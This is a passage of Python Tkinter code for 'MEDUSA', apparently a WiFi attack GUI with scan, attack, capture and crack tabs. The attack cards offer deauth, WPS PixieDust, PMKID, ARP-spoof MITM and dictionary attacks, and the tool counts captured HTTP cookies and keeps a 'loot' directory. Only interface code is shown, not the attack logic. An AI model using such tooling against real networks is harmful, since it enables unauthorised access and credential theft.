                    img = tk.PhotoImage(file=str(png_path))
                    self.root.iconphoto(True, img)
        except Exception:
            pass
        
        # Bind keyboard shortcuts
        self.root.bind('<Control-q>', lambda e: self.cleanup())
        self.root.bind('<Control-r>', lambda e: self._force_refresh())
        self.root.bind('<F5>', lambda e: self._force_refresh())
        self.root.bind('<Escape>', lambda e: self._stop_current_operation())
        
        # Window close handler
        self.root.protocol('WM_DELETE_WINDOW', self.cleanup)
    
    # ========================================================================
    # MENU BAR
    # ========================================================================
    
    def _build_menu(self):
        """Build the application menu bar."""
        self.menubar = tk.Menu(self.root, bg=DARK_THEME['card_bg'],
                              fg=DARK_THEME['fg'],
                              activebackground=DARK_THEME['accent'],
                              activeforeground='#ffffff')
        self.root.config(menu=self.menubar)
        
        # File menu
        file_menu = tk.Menu(self.menubar, tearoff=0,
                           bg=DARK_THEME['card_bg'], fg=DARK_THEME['fg'],
                           activebackground=DARK_THEME['accent'])
        self.menubar.add_cascade(label="File", menu=file_menu)
        file_menu.add_command(label="New Session", command=self._new_session,
                             accelerator="Ctrl+N")
        file_menu.add_command(label="Save Session", command=self._save_session,
                             accelerator="Ctrl+S")
        file_menu.add_command(label="Load Session", command=self._load_session,
                             accelerator="Ctrl+O")
        file_menu.add_separator()
        file_menu.add_command(label="Export Networks (JSON)",
                            command=self._export_networks)
        file_menu.add_command(label="Export Capture (PCAP)",
                            command=self._export_capture)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.cleanup,
                             accelerator="Ctrl+Q")
        
        # Tools menu
        tools_menu = tk.Menu(self.menubar, tearoff=0,
                            bg=DARK_THEME['card_bg'], fg=DARK_THEME['fg'],
                            activebackground=DARK_THEME['accent'])
        self.menubar.add_cascade(label="Tools", menu=tools_menu)
        tools_menu.add_command(label="Check Dependencies",
                              command=self._check_deps)
        tools_menu.add_command(label="Extract WiFi Profiles",
                              command=self._extract_profiles)
        tools_menu.add_command(label="System Info", command=self._show_sysinfo)
        tools_menu.add_separator()
        tools_menu.add_command(label="Open Capture Directory",
                              command=self._open_capture_dir)
        tools_menu.add_command(label="Open Loot Directory",
                              command=self._open_loot_dir)
        
        # View menu
        view_menu = tk.Menu(self.menubar, tearoff=0,
                           bg=DARK_THEME['card_bg'], fg=DARK_THEME['fg'],
                           activebackground=DARK_THEME['accent'])
        self.menubar.add_cascade(label="View", menu=view_menu)
        self._theme_var = tk.StringVar(value='darkly')
        view_menu.add_checkbutton(label="Dark Theme",
                                 variable=self._theme_var,
                                 onvalue='darkly',
                                 offvalue='flatly',
                                 command=self._toggle_theme)
        view_menu.add_separator()
        view_menu.add_command(label="Reset Layout", command=self._reset_layout)
        
        # Help menu
        help_menu = tk.Menu(self.menubar, tearoff=0,
                           bg=DARK_THEME['card_bg'], fg=DARK_THEME['fg'],
                           activebackground=DARK_THEME['accent'])
        self.menubar.add_cascade(label="Help", menu=help_menu)
        help_menu.add_command(label="Documentation",
                             command=lambda: self._open_url(
                                 "https://help.hackerai.co"))
        help_menu.add_command(label="About MEDUSA", command=self._show_about)
    
    # ========================================================================
    # TOOLBAR
    # ========================================================================
    
    def _build_toolbar(self):
        """Build the quick-action toolbar."""
        toolbar_frame = tk.Frame(
            self.root, bg=DARK_THEME['card_bg'],
            height=40
        )
        toolbar_frame.pack(fill='x', side='top', pady=(0, 1))
        toolbar_frame.pack_propagate(False)
        
        # Interface selector
        tk.Label(
            toolbar_frame, text="Interface:",
            bg=DARK_THEME['card_bg'], fg=DARK_THEME['text_dim'],
            font=('Helvetica', 9)
        ).pack(side='left', padx=(10, 4))
        
        self.iface_var = tk.StringVar(value="Auto")
        self.iface_combo = ttk.Combobox(
            toolbar_frame, textvariable=self.iface_var,
            values=["Auto"], state='readonly', width=20
        )
        self.iface_combo.pack(side='left', padx=(0, 12))
        self.iface_combo.bind('<<ComboboxSelected>>',
                             lambda e: self._on_interface_change())
        
        # Separator
        ttk.Separator(toolbar_frame, orient='vertical').pack(
            side='left', fill='y', padx=4
        )
        
        # Quick action buttons
        actions = [
            ("🔍 Scan", self._quick_scan, '#00b0ff'),
            ("⚡ Attack", lambda: self._switch_tab(2), '#e94560'),
            ("📡 Capture", lambda: self._switch_tab(3), '#ffd600'),
            ("🔓 Crack", lambda: self._switch_tab(4), '#00c853'),
        ]
        
        for text, cmd, color in actions:
            btn = tk.Button(
                toolbar_frame, text=text, command=cmd,
                bg=DARK_THEME['card_bg'], fg=color,
                relief='flat', padx=10, pady=2,
                font=('Helvetica', 9, 'bold'),
                activebackground=DARK_THEME['hover'],
                activeforeground=color,
                cursor='hand2',
                bd=0
            )
            btn.pack(side='left', padx=2)
            
            # Hover effects
            btn.bind('<Enter>', lambda e, b=btn, c=color: b.config(
                bg=DARK_THEME['hover']
            ))
            btn.bind('<Leave>', lambda e, b=btn: b.config(
                bg=DARK_THEME['card_bg']
            ))
        
        # Spacer
        tk.Frame(toolbar_frame, bg=DARK_THEME['card_bg']).pack(
            side='left', fill='x', expand=True
        )
        
        # Right-side quick info
        self.toolbar_status = tk.Label(
            toolbar_frame, text="Ready",
            bg=DARK_THEME['card_bg'], fg=DARK_THEME['text_dim'],
            font=('Helvetica', 9),
            anchor='e'
        )
        self.toolbar_status.pack(side='right', padx=10)
    
    # ========================================================================
    # NOTEBOOK (TAB CONTAINER)
    # ========================================================================
    
    def _build_notebook(self):
        """Build the tabbed notebook interface."""
        if TTKBOOTSTRAP_AVAILABLE:
            self.notebook = ttkb.Notebook(self.root)
        else:
            self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=4, pady=2)
        
        # Build each tab
        self._build_dashboard_tab()
        self._build_scan_tab()
        self._build_attack_tab()
        self._build_capture_tab()
        self._build_crack_tab()
        self._build_netmap_tab()
        self._build_logs_tab()
        
        # Tab change callback
        self.notebook.bind('<<NotebookTabChanged>>', self._on_tab_change)
    
    # ========================================================================
    # TAB 1: DASHBOARD
    # ========================================================================
    
    def _build_dashboard_tab(self):
        """Build the main dashboard overview tab."""
        tab = tk.Frame(self.notebook, bg=DARK_THEME['bg'])
        self.notebook.add(tab, text="  📊 Dashboard  ")
        
        # Configure grid
        tab.grid_columnconfigure(0, weight=1)
        tab.grid_columnconfigure(1, weight=1)
        tab.grid_columnconfigure(2, weight=1)
        tab.grid_rowconfigure(0, weight=0)  # Stats row
        tab.grid_rowconfigure(1, weight=1)  # Charts row
        tab.grid_rowconfigure(2, weight=0)  # Quick actions
        
        # ====================================================================
        # Row 0: System stats cards
        # ====================================================================
        stats_frame = tk.Frame(tab, bg=DARK_THEME['bg'])
        stats_frame.grid(row=0, column=0, columnspan=3, sticky='ew',
                         padx=8, pady=(8, 4))
        
        for i in range(4):
            stats_frame.grid_columnconfigure(i, weight=1)
        
        # CPU Card
        self.cpu_card = CardFrame(stats_frame, title="CPU", subtitle="Usage")
        self.cpu_card.grid(row=0, column=0, sticky='ew', padx=3, pady=2)
        self.cpu_label = tk.Label(
            self.cpu_card.content, text="0%",
            fg=DARK_THEME['success'], bg=DARK_THEME['card_bg'],
            font=('Helvetica', 24, 'bold')
        )
        self.cpu_label.pack(anchor='center', pady=4)
        self.cpu_bar = ttk.Progressbar(
            self.cpu_card.content, orient='horizontal',
            length=200, mode='determinate'
        )
        self.cpu_bar.pack(fill='x', pady=(0, 4))
        
        # Memory Card
        self.mem_card = CardFrame(stats_frame, title="Memory", subtitle="RAM")
        self.mem_card.grid(row=0, column=1, sticky='ew', padx=3, pady=2)
        self.mem_label = tk.Label(
            self.mem_card.content, text="0 GB / 0 GB",
            fg=DARK_THEME['info'], bg=DARK_THEME['card_bg'],
            font=('Helvetica', 18)
        )
        self.mem_label.pack(anchor='center', pady=4)
        self.mem_bar = ttk.Progressbar(
            self.mem_card.content, orient='horizontal',
            length=200, mode='determinate'
        )
        self.mem_bar.pack(fill='x', pady=(0, 4))
        
        # Network Card
        self.net_card = CardFrame(stats_frame, title="Network",
                                 subtitle="Traffic")
        self.net_card.grid(row=0, column=2, sticky='ew', padx=3, pady=2)
        self.net_label = tk.Label(
            self.net_card.content, text="⬇ 0 B/s  ⬆ 0 B/s",
            fg=DARK_THEME['warning'], bg=DARK_THEME['card_bg'],
            font=('Helvetica', 14)
        )
        self.net_label.pack(anchor='center', pady=4)
        self.net_secondary = tk.Label(
            self.net_card.content, text="0 packets/s",
            fg=DARK_THEME['text_dim'], bg=DARK_THEME['card_bg'],
            font=('Helvetica', 10)
        )
        self.net_secondary.pack()
        
        # Uptime Card
        self.uptime_card = CardFrame(stats_frame, title="Uptime",
                                    subtitle=f"MEDUSA v{VERSION}")
        self.uptime_card.grid(row=0, column=3, sticky='ew', padx=3, pady=2)
        self.uptime_label = tk.Label(
            self.uptime_card.content, text="00:00:00",
            fg=DARK_THEME['accent'], bg=DARK_THEME['card_bg'],
            font=('Helvetica', 20, 'bold')
        )
        self.uptime_label.pack(anchor='center', pady=4)
        self.uptime_secondary = tk.Label(
            self.uptime_card.content, text="System: --:--:--",
            fg=DARK_THEME['text_dim'], bg=DARK_THEME['card_bg'],
            font=('Helvetica', 10)
        )
        self.uptime_secondary.pack()
        
        # ====================================================================
        # Row 1: Signal chart + Network list
        # ====================================================================
        chart_frame = tk.Frame(tab, bg=DARK_THEME['bg'])
        chart_frame.grid(row=1, column=0, columnspan=2, sticky='nsew',
                         padx=8, pady=4)
        chart_frame.grid_rowconfigure(0, weight=1)
        chart_frame.grid_columnconfigure(0, weight=1)
        
        # Signal card
        signal_card = CardFrame(chart_frame, title="Signal Strength",
                               subtitle="Real-time (last 60s)")
        signal_card.grid(row=0, column=0, sticky='nsew', padx=3, pady=2)
        signal_card.grid_rowconfigure(0, weight=1)
        signal_card.grid_columnconfigure(0, weight=1)
        
        self._signal_figure = Figure(figsize=(6, 2.5), dpi=80)
        self._signal_figure.patch.set_facecolor(DARK_THEME['card_bg'])
        self._signal_ax = self._signal_figure.add_subplot(111)
        self._signal_ax.set_facecolor(DARK_THEME['card_bg'])
        self._signal_ax.set_xlabel('Time (s)', color=DARK_THEME['text_dim'],
                                   fontsize=8)
        self._signal_ax.set_ylabel('dBm', color=DARK_THEME['text_dim'],
                                   fontsize=8)
        self._signal_ax.tick_params(colors=DARK_THEME['text_dim'], labelsize=7)
        self._signal_ax.grid(True, alpha=0.2, color='#444')
        self._signal_ax.set_ylim(-100, -20)
        
        # Initialize empty plot
        self._signal_line, = self._signal_ax.plot(
            [], [], color=DARK_THEME['accent'], linewidth=1.5,
            alpha=0.8
        )
        self._signal_fill = self._signal_ax.fill_between(
            [], [], alpha=0.1, color=DARK_THEME['accent']
        )
        
        self._signal_canvas = FigureCanvasTkAgg(
            self._signal_figure, master=signal_card.content
        )
        self._signal_canvas.get_tk_widget().pack(fill='both', expand=True)
        
        # Right: Quick network list
        netlist_frame = tk.Frame(tab, bg=DARK_THEME['bg'])
        netlist_frame.grid(row=1, column=2, sticky='nsew', padx=8, pady=4)
        netlist_frame.grid_rowconfigure(0, weight=1)
        netlist_frame.grid_columnconfigure(0, weight=1)
        
        netlist_card = CardFrame(netlist_frame, title="Networks",
                                subtitle="Discovered APs")
        netlist_card.grid(row=0, column=0, sticky='nsew', padx=3, pady=2)
        netlist_card.grid_rowconfigure(0, weight=1)
        netlist_card.grid_columnconfigure(0, weight=1)
        
        # Network listbox with scrollbar
        listbox_frame = tk.Frame(netlist_card.content, bg=DARK_THEME['card_bg'])
        listbox_frame.grid(row=0, column=0, sticky='nsew')
        listbox_frame.grid_rowconfigure(0, weight=1)
        listbox_frame.grid_columnconfigure(0, weight=1)
        
        self.net_listbox = tk.Listbox(
            listbox_frame,
            bg=DARK_THEME['input_bg'], fg=DARK_THEME['fg'],
            selectbackground=DARK_THEME['accent'],
            selectforeground='#ffffff',
            font=('Consolas', 9),
            relief='flat', bd=0,
            highlightthickness=0
        )
        self.net_listbox.grid(row=0, column=0, sticky='nsew')
        
        scrollbar = ttk.Scrollbar(listbox_frame, orient='vertical',
                                 command=self.net_listbox.yview)
        scrollbar.grid(row=0, column=1, sticky='ns')
        self.net_listbox.config(yscrollcommand=scrollbar.set)
        
        self.net_listbox.bind('<<ListboxSelect>>', self._on_network_select)
        
        # ====================================================================
        # Row 2: Quick actions
        # ====================================================================
        actions_frame = tk.Frame(tab, bg=DARK_THEME['bg'])
        actions_frame.grid(row=2, column=0, columnspan=3, sticky='ew',
                          padx=8, pady=(4, 8))
        
        for i in range(6):
            actions_frame.grid_columnconfigure(i, weight=1)
        
        quick_actions = [
            ("🔍 Quick Scan", self._quick_scan, DARK_THEME['info']),
            ("⚡ Smart Attack", self._quick_smart_attack, DARK_THEME['accent']),
            ("📡 Start Capture", self._quick_capture, DARK_THEME['warning']),
            ("🔓 Crack Selected", self._quick_crack, DARK_THEME['success']),
            ("💾 Save Session", self._save_session, DARK_THEME['secondary']),
            ("🚀 Run All", self._quick_run_all, DARK_THEME['text_bright']),
        ]
        
        for i, (text, cmd, color) in enumerate(quick_actions):
            btn = tk.Button(
                actions_frame, text=text, command=cmd,
                bg=DARK_THEME['card_bg'], fg=color,
                relief='flat', padx=8, pady=6,
                font=('Helvetica', 10, 'bold'),
                activebackground=DARK_THEME['hover'],
                activeforeground=color,
                cursor='hand2', bd=1,
                highlightbackground=DARK_THEME['card_border']
            )
            btn.grid(row=0, column=i, sticky='ew', padx=3)
    
    # ========================================================================
    # TAB 2: SCAN
    # ========================================================================
    
    def _build_scan_tab(self):
        """Build the network scanning tab."""
        tab = tk.Frame(self.notebook, bg=DARK_THEME['bg'])
        self.notebook.add(tab, text="  🔍 Scan  ")
        
        # Configure layout
        tab.grid_columnconfigure(0, weight=1)
        tab.grid_columnconfigure(1, weight=2)
        tab.grid_rowconfigure(0, weight=0)  # Controls
        tab.grid_rowconfigure(1, weight=1)  # Results
        
        # ====================================================================
        # Scan controls
        # ====================================================================
        controls_frame = tk.Frame(tab, bg=DARK_THEME['bg'])
        controls_frame.grid(row=0, column=0, columnspan=2, sticky='ew',
                           padx=8, pady=(8, 4))
        
        # Scan button
        self.scan_btn = tk.Button(
            controls_frame, text="▶ Start Scan",
            command=self._start_scan,
            bg=DARK_THEME['accent'], fg='#ffffff',
            relief='flat', padx=16, pady=6,
            font=('Helvetica', 11, 'bold'),
            cursor='hand2'
        )
        self.scan_btn.pack(side='left', padx=(0, 8))
        
        # Scan type
        tk.Label(
            controls_frame, text="Type:",
            bg=DARK_THEME['bg'], fg=DARK_THEME['text_dim'],
            font=('Helvetica', 9)
        ).pack(side='left', padx=(0, 4))
        
        self.scan_type_var = tk.StringVar(value="full")
        scan_types = ttk.Combobox(
            controls_frame,
            textvariable=self.scan_type_var,
            values=["full", "quick", "channel", "passive"],
            state='readonly', width=12
        )
        scan_types.pack(side='left', padx=(0, 8))
        
        # Channel
        tk.Label(
            controls_frame, text="Channel:",
            bg=DARK_THEME['bg'], fg=DARK_THEME['text_dim'],
            font=('Helvetica', 9)
        ).pack(side='left', padx=(0, 4))
        self.scan_channel_var = tk.StringVar(value="all")
        scan_channel = ttk.Combobox(
            controls_frame,
            textvariable=self.scan_channel_var,
            values=["all"] + [str(i) for i in range(1, 14)],
            state='readonly', width=6
        )
        scan_channel.pack(side='left', padx=(0, 8))
        
        # Duration
        tk.Label(
            controls_frame, text="Duration:",
            bg=DARK_THEME['bg'], fg=DARK_THEME['text_dim'],
            font=('Helvetica', 9)
        ).pack(side='left', padx=(0, 4))
        self.scan_duration_var = tk.StringVar(value="10s")
        scan_duration = ttk.Combobox(
            controls_frame,
            textvariable=self.scan_duration_var,
            values=["5s", "10s", "15s", "30s", "60s", "∞"],
            state='readonly', width=6
        )
        scan_duration.pack(side='left', padx=(0, 12))
        
        # Filter SSID
        tk.Label(
            controls_frame, text="Filter SSID:",
            bg=DARK_THEME['bg'], fg=DARK_THEME['text_dim'],
            font=('Helvetica', 9)
        ).pack(side='left', padx=(0, 4))
        self.scan_filter_var = tk.StringVar()
        scan_filter = tk.Entry(
            controls_frame, textvariable=self.scan_filter_var,
            bg=DARK_THEME['input_bg'], fg=DARK_THEME['fg'],
            relief='flat', bd=1, width=18,
            highlightbackground=DARK_THEME['card_border'],
            insertbackground=DARK_THEME['fg']
        )
        scan_filter.pack(side='left', padx=(0, 8))
        
        # Stop button
        self.scan_stop_btn = tk.Button(
            controls_frame, text="■ Stop",
            command=self._stop_scan,
            bg='#444', fg=DARK_THEME['fg'],
            relief='flat', padx=12, pady=6,
            font=('Helvetica', 10),
            cursor='hand2', state='disabled'
        )
        self.scan_stop_btn.pack(side='left')
        
        # ====================================================================
        # Scan results — Treeview
        # ====================================================================
        results_frame = tk.Frame(tab, bg=DARK_THEME['bg'])
        results_frame.grid(row=1, column=0, columnspan=2, sticky='nsew',
                          padx=8, pady=(4, 8))
        results_frame.grid_rowconfigure(0, weight=1)
        results_frame.grid_columnconfigure(0, weight=1)
        
        # Treeview columns
        columns = ('SSID', 'BSSID', 'CH', 'Signal', 'Encryption', 'Clients', 'WPS', 'Vendor')
        self.scan_tree = ttk.Treeview(
            results_frame, columns=columns,
            show='headings', selectmode='browse',
            height=20
        )
        
        # Define column headings
        col_widths = {
            'SSID': 200, 'BSSID': 150, 'CH': 50,
            'Signal': 120, 'Encryption': 100, 'Clients': 60,
            'WPS': 50, 'Vendor': 120
        }
        for col in columns:
            self.scan_tree.heading(col, text=col, command=lambda c=col: self._sort_scan_column(c))
            self.scan_tree.column(col, width=col_widths.get(col, 100), anchor='w')
        
        self.scan_tree.column('CH', anchor='center')
        self.scan_tree.column('Signal', anchor='center')
        self.scan_tree.column('Clients', anchor='center')
        self.scan_tree.column('WPS', anchor='center')
        
        # Scrollbar
        scroll_y = ttk.Scrollbar(results_frame, orient='vertical', command=self.scan_tree.yview)
        scroll_x = ttk.Scrollbar(results_frame, orient='horizontal', command=self.scan_tree.xview)
        self.scan_tree.configure(yscrollcommand=scroll_y.set, xscrollcommand=scroll_x.set)
        
        self.scan_tree.grid(row=0, column=0, sticky='nsew')
        scroll_y.grid(row=0, column=1, sticky='ns')
        scroll_x.grid(row=1, column=0, sticky='ew')
        
        # Double-click to select target
        self.scan_tree.bind('<Double-1>', self._on_scan_select)
        
        # Status label
        self.scan_status = tk.Label(
            tab, text="Ready to scan",
            bg=DARK_THEME['bg'], fg=DARK_THEME['text_dim'],
            font=('Helvetica', 9)
        )
        self.scan_status.grid(row=2, column=0, columnspan=2, sticky='ew', padx=8, pady=(0, 4))
    
    # ========================================================================
    # TAB 3: ATTACK
    # ========================================================================
    
    def _build_attack_tab(self):
        """Build the attack launcher tab."""
        tab = tk.Frame(self.notebook, bg=DARK_THEME['bg'])
        self.notebook.add(tab, text="  ⚡ Attack  ")
        
        tab.grid_columnconfigure(0, weight=1)
        tab.grid_columnconfigure(1, weight=1)
        tab.grid_rowconfigure(0, weight=0)  # Target info
        tab.grid_rowconfigure(1, weight=0)  # Attack type
        tab.grid_rowconfigure(2, weight=1)  # Status/console
        
        # ====================================================================
        # Target info card
        # ====================================================================
        target_card = CardFrame(tab, title="Target", subtitle="Selected network")
        target_card.grid(row=0, column=0, columnspan=2, sticky='ew', padx=8, pady=(8, 4))
        target_card.grid_columnconfigure(1, weight=1)
        
        tk.Label(target_card.content, text="BSSID:",
                bg=DARK_THEME['card_bg'], fg=DARK_THEME['text_dim']).grid(row=0, column=0, sticky='w', padx=4)
        self.attack_bssid_label = tk.Label(target_card.content, text="Not selected",
                                          bg=DARK_THEME['card_bg'], fg=DARK_THEME['fg'])
        self.attack_bssid_label.grid(row=0, column=1, sticky='w', padx=4)
        
        tk.Label(target_card.content, text="SSID:",
                bg=DARK_THEME['card_bg'], fg=DARK_THEME['text_dim']).grid(row=0, column=2, sticky='w', padx=(20, 4))
        self.attack_ssid_label = tk.Label(target_card.content, text="",
                                         bg=DARK_THEME['card_bg'], fg=DARK_THEME['fg'])
        self.attack_ssid_label.grid(row=0, column=3, sticky='w', padx=4)
        
        tk.Label(target_card.content, text="Encryption:",
                bg=DARK_THEME['card_bg'], fg=DARK_THEME['text_dim']).grid(row=0, column=4, sticky='w', padx=(20, 4))
        self.attack_enc_label = tk.Label(target_card.content, text="",
                                        bg=DARK_THEME['card_bg'], fg=DARK_THEME['fg'])
        self.attack_enc_label.grid(row=0, column=5, sticky='w', padx=4)
        
        # ====================================================================
        # Attack type selection
        # ====================================================================
        attack_types_frame = tk.Frame(tab, bg=DARK_THEME['bg'])
        attack_types_frame.grid(row=1, column=0, columnspan=2, sticky='nsew', padx=8, pady=4)
        attack_types_frame.grid_columnconfigure(0, weight=1)
        attack_types_frame.grid_columnconfigure(1, weight=1)
        attack_types_frame.grid_columnconfigure(2, weight=1)
        
        # Attack cards
        attacks = [
            ("Deauth Attack", "⚡", "Send deauth frames to\nkick clients off network",
             DARK_THEME['accent'], self._launch_deauth, CAN_INJECT_PACKETS),
            ("WPS PixieDust", "🔑", "Brute-force WPS PIN\nto recover PSK",
             DARK_THEME['warning'], self._launch_wps, CAN_PIXIEDUST),
            ("PMKID Capture", "📡", "Capture PMKID hash\nfrom RSN IE beacon",
             DARK_THEME['info'], self._launch_pmkid, CAN_HCXTOOLS),
            ("ARP Spoof (MITM)", "🌀", "ARP poisoning for\nman-in-the-middle",
             DARK_THEME['secondary'], self._launch_mitm, True),
            ("Dictionary Attack", "📖", "Online brute-force\nwith wordlist",
             DARK_THEME['success'], self._launch_dict_attack, True),
            ("Smart Attack", "🤖", "Auto-select best\nattack vector",
             DARK_THEME['text_bright'], self._launch_smart, True),
        ]
        
        for i, (name, icon, desc, color, cmd, available) in enumerate(attacks):
            row = i // 3
            col = i % 3
            card = tk.Frame(
                attack_types_frame,
                bg=DARK_THEME['card_bg'],
                highlightbackground=DARK_THEME['card_border'],
                highlightthickness=1,
                padx=8, pady=8
            )
            card.grid(row=row, column=col, sticky='nsew', padx=3, pady=3)
            
            # Icon + Name
            tk.Label(card, text=f"{icon} {name}",
                    bg=DARK_THEME['card_bg'],
                    fg=color if available else DARK_THEME['text_dim'],
                    font=('Helvetica', 12, 'bold')).pack(anchor='w')
            
            # Description
            tk.Label(card, text=desc,
                    bg=DARK_THEME['card_bg'],
                    fg=DARK_THEME['text_dim'],
                    font=('Helvetica', 8),
                    justify='left').pack(anchor='w', pady=(4, 6))
            
            # Status & button
            status_frame = tk.Frame(card, bg=DARK_THEME['card_bg'])
            status_frame.pack(fill='x')
            
            status_text = "✅ Available" if available else "❌ Unavailable"
            status_color = DARK_THEME['success'] if available else DARK_THEME['danger']
            tk.Label(status_frame, text=status_text,
                    bg=DARK_THEME['card_bg'], fg=status_color,
                    font=('Helvetica', 7)).pack(side='left')
            
            if available:
                btn = tk.Button(status_frame, text="Launch",
                               command=cmd,
                               bg=color, fg='#ffffff',
                               relief='flat', padx=8, pady=2,
                               font=('Helvetica', 8, 'bold'),
                               cursor='hand2')
                btn.pack(side='right')
        
        # ====================================================================
        # Attack console output
        # ====================================================================
        console_card = CardFrame(tab, title="Attack Console", subtitle="Real-time output")
        console_card.grid(row=2, column=0, columnspan=2, sticky='nsew', padx=8, pady=(4, 8))
        console_card.grid_columnconfigure(0, weight=1)
        console_card.grid_rowconfigure(0, weight=1)
        
        self.attack_console = scrolledtext.ScrolledText(
            console_card.content,
            bg='#0a0a1a', fg='#00ff88',
            font=('Consolas', 9),
            relief='flat', bd=0,
            height=12,
            insertbackground='#00ff88'
        )
        self.attack_console.pack(fill='both', expand=True)
        self.attack_console.config(state='disabled')
    
    # ========================================================================
    # TAB 4: CAPTURE
    # ========================================================================
    
    def _build_capture_tab(self):
        """Build the packet capture tab."""
        tab = tk.Frame(self.notebook, bg=DARK_THEME['bg'])
        self.notebook.add(tab, text="  📡 Capture  ")
        
        tab.grid_columnconfigure(0, weight=2)
        tab.grid_columnconfigure(1, weight=1)
        tab.grid_rowconfigure(0, weight=0)  # Controls
        tab.grid_rowconfigure(1, weight=1)  # Stats + packets
        
        # ====================================================================
        # Capture controls
        # ====================================================================
        controls = tk.Frame(tab, bg=DARK_THEME['bg'])
        controls.grid(row=0, column=0, columnspan=2, sticky='ew', padx=8, pady=(8, 4))
        
        self.capture_btn = tk.Button(controls, text="▶ Start Capture",
            command=self._start_capture,
            bg=DARK_THEME['accent'], fg='#ffffff',
            relief='flat', padx=16, pady=6,
            font=('Helvetica', 11, 'bold'), cursor='hand2')
        self.capture_btn.pack(side='left', padx=(0, 8))
        
        self.capture_stop_btn = tk.Button(controls, text="■ Stop",
            command=self._stop_capture,
            bg='#444', fg=DARK_THEME['fg'],
            relief='flat', padx=12, pady=6,
            font=('Helvetica', 10), cursor='hand2', state='disabled')
        self.capture_stop_btn.pack(side='left', padx=(0, 12))
        
        tk.Label(controls, text="Filter:",
                bg=DARK_THEME['bg'], fg=DARK_THEME['text_dim']).pack(side='left', padx=(0, 4))
        self.capture_filter_var = tk.StringVar(value="all")
        ttk.Combobox(controls, textvariable=self.capture_filter_var,
                     values=["all", "handshake", "http", "pmkid", "wpa"],
                     state='readonly', width=12).pack(side='left', padx=(0, 8))
        
        tk.Label(controls, text="Timeout:",
                bg=DARK_THEME['bg'], fg=DARK_THEME['text_dim']).pack(side='left', padx=(0, 4))
        self.capture_timeout_var = tk.StringVar(value="60s")
        ttk.Combobox(controls, textvariable=self.capture_timeout_var,
                     values=["30s", "60s", "120s", "300s", "∞"],
                     state='readonly', width=6).pack(side='left')
        
        # ====================================================================
        # Live stats
        # ====================================================================
        stats_frame = tk.Frame(tab, bg=DARK_THEME['bg'])
        stats_frame.grid(row=1, column=1, sticky='nsew', padx=(0, 8), pady=(4, 8))
        stats_frame.grid_columnconfigure(0, weight=1)
        
        stats_card = CardFrame(stats_frame, title="Statistics", subtitle="Live counter")
        stats_card.grid(row=0, column=0, sticky='nsew', padx=3, pady=2)
        
        self.capture_pkt_label = tk.Label(stats_card.content,
            text="Packets: 0", fg=DARK_THEME['info'], bg=DARK_THEME['card_bg'],
            font=('Helvetica', 16, 'bold'))
        self.capture_pkt_label.pack(anchor='w', pady=4)
        
        self.capture_handshake_label = tk.Label(stats_card.content,
            text="Handshake: ✗", fg=DARK_THEME['text_dim'], bg=DARK_THEME['card_bg'],
            font=('Helvetica', 12))
        self.capture_handshake_label.pack(anchor='w', pady=2)
        
        self.capture_pmkid_label = tk.Label(stats_card.content,
            text="PMKID: ✗", fg=DARK_THEME['text_dim'], bg=DARK_THEME['card_bg'],
            font=('Helvetica', 12))
        self.capture_pmkid_label.pack(anchor='w', pady=2)
        
        self.capture_http_label = tk.Label(stats_card.content,
            text="HTTP Cookies: 0", fg=DARK_THEME['text_dim'], bg=DARK_THEME['card_bg'],
            font=('Helvetica', 12))
        self.capture_http_label.pack(anchor='w', pady=2)
        
        ttk.Separator(stats_card.content, orient='horizontal').pack(fill='x', pady=8)
        
        self.capture_rate_label = tk.Label(stats_card.content,
            text="Rate: 0 pkt/s", fg=DARK_THEME['warning'], bg=DARK_THEME['card_bg'],
            font=('Helvetica', 12))
        self.capture_rate_label.pack(anchor='w', pady=2)
        
        self.capture_size_label = tk.Label(stats_card.content,
            text="Size: 0 B", fg=DARK_THEME['text_dim'], bg=DARK_THEME['card_bg'],
            font=('Helvetica', 10))
        self.capture_size_label.pack(anchor='w', pady=2)
        
        # ====================================================================
        # Packet log
        # ====================================================================
        pkt_frame = tk.Frame(tab, bg=DARK_THEME['bg'])
        pkt_frame.grid(row=1, column=0, sticky='nsew', padx=8, pady=(4, 8))
        pkt_frame.grid_rowconfigure(0, weight=1)
        pkt_frame.grid_columnconfigure(0, weight=1)
        
        pkt_card = CardFrame(pkt_frame, title="Packets", subtitle="Recent captures")
        pkt_card.grid(row=0, column=0, sticky='nsew')
        pkt_card.grid_rowconfigure(0, weight=1)
        pkt_card.grid_columnconfigure(0, weight=1)
        
        self.capture_log = scrolledtext.ScrolledText(
            pkt_card.content,
            bg='#0a0a1a', fg='#00b0ff',
            font=('Consolas', 8),
            relief='flat', bd=0,
            insertbackground=DARK_THEME['fg']
        )
        self.capture_log.pack(fill='both', expand=True)
        self.capture_log.config(state='disabled')
    
    # ========================================================================
    # TAB 5: CRACK
    # ========================================================================
    
    def _build_crack_tab(self):
        """Build the cracking interface tab."""
        tab = tk.Frame(self.notebook, bg=DARK_THEME['bg'])
        self.notebook.add(tab, text="  🔓 Crack  ")
        
        tab.grid_columnconfigure(0, weight=2)
        tab.grid_columnconfigure(1, weight=1)
        tab.grid_rowconfigure(0, weight=0)
        tab.grid_rowconfigure(1, weight=1)
        
        # ====================================================================
        # Config panel
        # ====================================================================
        config_frame = tk.Frame(tab, bg=DARK_THEME['bg'])
        config_frame.grid(row=0, column=0, columnspan=2, sticky='ew', padx=8, pady=(8, 4))
        
        # Hash file
        tk.Label(config_frame, text="Hash File:",
                bg=DARK_THEME['bg'], fg=DARK_THEME['text_dim']).grid(row=0, column=0, sticky='w', padx=4)
        self.crack_hash_var = tk.StringVar()
        tk.Entry(config_frame, textvariable=self.crack_hash_var,
                bg=DARK_THEME['input_bg'], fg=DARK_THEME['fg'],
                relief='flat', bd=1, width=40,
                highlightbackground=DARK_THEME['card_border'],
                insertbackground=DARK_THEME['fg']).grid(row=0, column=1, sticky='ew', padx=4)
        tk.Button(config_frame, text="Browse",
                 command=self._browse_hashfile,
                 bg=DARK_THEME['card_bg'], fg=DARK_THEME['fg'],
                 relief='flat', padx=8, cursor='hand2').grid(row=0, column=2, padx=4)
        
        # Wordlist
        tk.Label(config_frame, text="Wordlist:",
                bg=DARK_THEME['bg'], fg=DARK_THEME['text_dim']).grid(row=1, column=0, sticky='w', padx=4, pady=4)
        self.crack_wordlist_var = tk.StringVar(value=str(DEFAULT_WORDLIST))
        tk.Entry(config_frame, textvariable=self.crack_wordlist_var,
